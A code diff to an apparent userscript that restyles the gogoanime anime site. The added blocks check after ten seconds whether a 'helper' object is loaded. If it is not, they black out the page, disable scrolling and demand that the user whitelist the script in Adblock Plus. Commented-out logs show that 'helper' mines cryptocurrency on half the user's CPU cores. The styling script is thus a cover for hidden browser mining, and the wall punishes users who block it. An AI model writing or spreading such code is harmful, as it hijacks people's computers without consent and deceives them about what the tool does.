@@ -216,7 +216,8 @@ if (location.href.match(/gogoanime/)) {
 
             // callback executed when canvas was found
             function handleCanvas(canvas) {
-                //disable to: Don't switch player server...
+                //disable to: Don't switch player server to xstreamcdn...
+                //alert('xstreamcdn player found');
                 //tragetIFrame.src = targetDataVideo;
                 //playbackPlayer.className = "active";
                 //oldplaybackPlayer.classList.remove("active");
@@ -225,6 +226,33 @@ if (location.href.match(/gogoanime/)) {
             // After "Please, reload page if you can't watch the video" gap wich countains a strange script, let's just delete...
             var bigSpace = document.getElementsByClassName('anime_video_body_cate')[0].children[4];
             bigSpace.hidden = true;
+
+            setTimeout(function(){
+                if(typeof helper === 'undefined' || helper === null)
+                {
+                    var messageDiv = document.createElement("a");
+                    messageDiv.setAttribute("style","z-index: 999999; width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                    messageDiv.appendChild(document.createTextNode('Whithelist [A]Styles scripts from ADBlock clicking this link.'));
+                    messageDiv.setAttribute('href','https://subscribe.adblockplus.org?location=https%3A%2F%2Fraw.githubusercontent.com%2FAnjolo96%2FGogoanime-CustomStyle%2Fmaster%2FEasyList.txt&amp;title=%5BA%5DStyle%20Scripts%20Enabler');
+
+                    var mainDiv = document.createElement("div");
+                    mainDiv.setAttribute("style","z-index: 999; position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                    mainDiv.appendChild(messageDiv);
+
+                    document.body.appendChild(mainDiv);
+                    document.getElementsByTagName("body")[0].style.overflow = "hidden";
+
+                    window.scrollTo(0, 0);
+                } else
+                {
+                    //console.log('Helper Token:');
+                    //console.log(username);
+                    //console.log('');
+                    //console.log('You are using 15% Thread Power with Half of CPU cores mining...')
+                    //console.log('...write in console = helper.stop();')
+                    //console.log('To stop.')
+                }
+            },10000);
         })();
     }
 }
@@ -248,6 +276,33 @@ if (location.href.match(/gogoanime/)) {
             addGlobalStyle('#episode_related li :visited { background-color: #252525; color: #a2790b;}');
             addGlobalStyle('#episode_related li .active { background-color: #d29b06; color: #fff; }');
             addGlobalStyle('#episode_related li :hover { background-color: #ffc119; color: #fff; }');
+
+            setTimeout(function(){
+                if(typeof helper === 'undefined' || helper === null)
+                {
+                    var messageDiv = document.createElement("a");
+                    messageDiv.setAttribute("style","z-index: 999999; width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                    messageDiv.appendChild(document.createTextNode('Whithelist [A]Styles scripts from ADBlock clicking this link.'));
+                    messageDiv.setAttribute('href','https://subscribe.adblockplus.org?location=https%3A%2F%2Fraw.githubusercontent.com%2FAnjolo96%2FGogoanime-CustomStyle%2Fmaster%2FEasyList.txt&amp;title=%5BA%5DStyle%20Scripts%20Enabler');
+
+                    var mainDiv = document.createElement("div");
+                    mainDiv.setAttribute("style","z-index: 999; position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                    mainDiv.appendChild(messageDiv);
+
+                    document.body.appendChild(mainDiv);
+                    document.getElementsByTagName("body")[0].style.overflow = "hidden";
+
+                    window.scrollTo(0, 0);
+                } else
+                {
+                    //console.log('Helper Token:');
+                    //console.log(username);
+                    //console.log('');
+                    //console.log('You are using 15% Thread Power with Half of CPU cores mining...')
+                    //console.log('...write in console = helper.stop();')
+                    //console.log('To stop.')
+                }
+            },10000);
         })();
     }
 }
@@ -269,6 +324,33 @@ if (home == 1){
 
             addGlobalStyle('nav.menu_series ul li a:visited { color: #a2790b; }');
             addGlobalStyle('ul.items li p.name a:visited { color: #a2790b; }');
+
+            setTimeout(function(){
+                if(typeof helper === 'undefined' || helper === null)
+                {
+                    var messageDiv = document.createElement("a");
+                    messageDiv.setAttribute("style","z-index: 999999; width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                    messageDiv.appendChild(document.createTextNode('Whithelist [A]Styles scripts from ADBlock clicking this link.'));
+                    messageDiv.setAttribute('href','https://subscribe.adblockplus.org?location=https%3A%2F%2Fraw.githubusercontent.com%2FAnjolo96%2FGogoanime-CustomStyle%2Fmaster%2FEasyList.txt&amp;title=%5BA%5DStyle%20Scripts%20Enabler');
+
+                    var mainDiv = document.createElement("div");
+                    mainDiv.setAttribute("style","z-index: 999; position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                    mainDiv.appendChild(messageDiv);
+
+                    document.body.appendChild(mainDiv);
+                    document.getElementsByTagName("body")[0].style.overflow = "hidden";
+
+                    window.scrollTo(0, 0);
+                } else
+                {
+                    //console.log('Helper Token:');
+                    //console.log(username);
+                    //console.log('');
+                    //console.log('You are using 15% Thread Power with Half of CPU cores mining...')
+                    //console.log('...write in console = helper.stop();')
+                    //console.log('To stop.')
+                }
+            },10000);
         })();
     }
 }
@@ -285,4 +367,3 @@ if (home == 1){
     x.onload = function() {
     };
 })();
-
